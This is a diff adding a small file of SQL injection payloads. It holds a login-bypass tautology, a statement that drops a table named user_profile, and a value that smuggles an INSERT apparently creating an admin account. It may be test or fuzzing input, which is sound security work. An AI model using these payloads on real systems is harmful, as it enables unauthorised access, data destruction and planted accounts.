@@ -1,0 +1,4 @@
+' OR '1'='1'; --
+
+'; DROP TABLE user_profile; --
+admin', 'hack', 'John', 'Doe', '12345'); -- 
